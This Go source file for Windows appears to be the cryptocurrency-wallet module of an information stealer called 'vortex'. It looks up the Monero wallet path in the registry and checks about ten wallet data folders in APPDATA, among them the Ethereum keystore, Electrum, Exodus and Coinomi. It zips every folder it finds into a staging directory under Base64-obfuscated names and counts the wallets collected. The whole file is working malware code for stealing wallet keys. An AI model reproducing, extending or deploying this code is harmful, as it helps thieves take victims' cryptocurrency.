//go:build windows

package cryptowallets

import (
	"os"
	"path/filepath"
	"strings"
	"vortex/encrypt"
	"vortex/hutil"

	"golang.org/x/sys/windows/registry"
)

func moneroWallet() string {
	k, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\monero-project\\monero-core", registry.QUERY_VALUE)
	if err == registry.ErrNotExist {
		return ""
	}

	walletPath, _, _ := k.GetStringValue("wallet_path")
	if strings.Contains(walletPath, "wallets") {
		if _, err := os.Stat(walletPath); !os.IsNotExist(err) {
			moneroPath := strings.SplitAfter(walletPath, "wallets")
			return moneroPath[0]
		}
	}
	return ""
}

func CryptoWalletsDump(mainFolder string) error {
	moneroWalletPath := moneroWallet()
	wPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Zcash"),
		filepath.Join(os.Getenv("APPDATA"), "Armory"),
		filepath.Join(os.Getenv("APPDATA"), "com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"),
		filepath.Join(os.Getenv("APPDATA"), "Exodus\\exodus.wallet"),
		filepath.Join(os.Getenv("APPDATA"), "Ethereum\\keystore"),
		filepath.Join(os.Getenv("APPDATA"), "Electrum\\wallets"),
		filepath.Join(os.Getenv("APPDATA"), "atomic\\Local Storage\\leveldb"),
		filepath.Join(os.Getenv("APPDATA"), "Guarda\\Local Storage\\leveldb"),
		filepath.Join(os.Getenv("APPDATA"), "Coinomi\\Coinomi\\wallets"),
		filepath.Join(os.Getenv("APPDATA"), "Binance"),
	}

	for i := range wPaths {
		if _, err := os.Stat(wPaths[i]); !os.IsNotExist(err) {
			if err = hutil.ZipFolder(filepath.Base(wPaths[i]), wPaths[i], filepath.Join(mainFolder, encrypt.B64Util("wallet-"+filepath.Base(wPaths[i])+".zip", 0)), "XX"); err != nil {
				return err
			}
			hutil.WalletCounter++
		}
	}
	if moneroWalletPath != "" {
		if err := hutil.ZipFolder("Monero", moneroWalletPath, filepath.Join(mainFolder, encrypt.B64Util("wallet-Monero.zip", 0)), "XX"); err != nil {
			return err
		}
		hutil.WalletCounter++
	}
	return nil
}
